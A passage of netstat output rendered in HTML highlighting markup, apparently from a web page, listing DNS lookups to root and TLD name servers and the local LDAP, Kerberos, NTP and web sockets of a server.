class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33225</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35583</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59151</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57893</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41387</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59799</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33915</span>      a.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49391</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57407</span>      j.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56914</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48997</span>      f.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56033</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56920</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">52587</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41519</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56916</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56916</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43685</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49173</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58851</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56910</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39871</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">54571</span>      c.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34605</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43537</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46791</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37013</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46399</span>      a2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">55289</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39255</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47487</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58451</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39255</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47487</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58451</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49089</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33023</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46925</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">53227</span>      h.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">60573</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56918</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34121</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46849</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51301</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51213</span>      d.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33379</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">52391</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37893</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39213</span>      c.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">36225</span>      d.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">52841</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56189</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50629</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43567</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">36957</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47391</span>      d.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35085</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">42349</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47627</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34175</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35877</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40979</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49659</span>      c.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49507</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57829</span>      D0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37275</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59037</span>      h.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56922</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56535</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56928</span> localhost.localdom:ldap TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56908</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47253</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50011</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47907</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">1</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39386</span>      <span class="hljs-number">202.115</span><span class="hljs-number">.89</span><span class="hljs-number">.103</span>:http-alt SYN_SENT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45417</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49667</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45737</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43643</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37993</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37993</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47981</span>      y.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41227</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33447</span>      ns-w.ant.isi.edu:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58111</span>      c0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59913</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">53117</span>      a.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48453</span>      j.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58467</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50803</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56599</span>      a.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59077</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48575</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56912</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">55893</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51429</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39265</span>      i.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">38027</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">60927</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39375</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56922</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56211</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50853</span>      dns2.edu.cn:domain      TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">42793</span>      c.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48795</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:www-http              *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:domain                *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:https                 *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::ffff:<span class="hljs-number">61.139</span>.:www-http ::ffff:<span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span>:<span class="hljs-number">64845</span> ESTABLISHED<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:kpasswd               *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.254</span>:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:domain     *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.141</span><span class="hljs-number">.142</span>:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.locald:domain *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.25</span>:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomai:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:kerberos   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:ntp     *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:ntp        *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdoma:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:ntp                   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span>:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdo:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.10</span>:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:domain                *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e:6ff:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:29ff:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e:6ff:fe6d:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:29ff:fe9f:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-number">1</span>:ntp                 *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:ntp                   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e::kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:<span class="hljs-number">2</span>:kerberos-iv *:*<br>Active UNIX domain sockets (servers <span class="hljs-keyword">and</span> established)<br>Proto RefCnt Flags       <span class="hljs-type">Type</span>       State         I-Node Path<br>unix  <span class="hljs-number">2</span>      [ ACC ]     STREAM     LISTENING     <span class="hljs-number">15995</span>  /var/run/acpid.socket<br>unix  <span class="hljs-number">2</span>      [ ACC ]     SEQPACKET  LISTENING     <span class="hljs-number">12410</span>  /run/udev/control<br>unix  <span class="hljs-number">9</span>      [ ]         DGRAM                    <span class="hljs-number">16811</span>  /dev/log<br>unix  <span class="hljs-number">3</span>      [ ]         STREAM     CONNECTED     <span class="hljs-number">20014</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19977</span><br>unix  <span class="hljs-number">3</span>      [ ]         STREAM     CONNECTED     <span class="hljs-number">20015</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19636</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">16830</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19316</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19606</span><br>unix  <span class="hljs-number">3</span>      [ ]         DGRAM                    <span 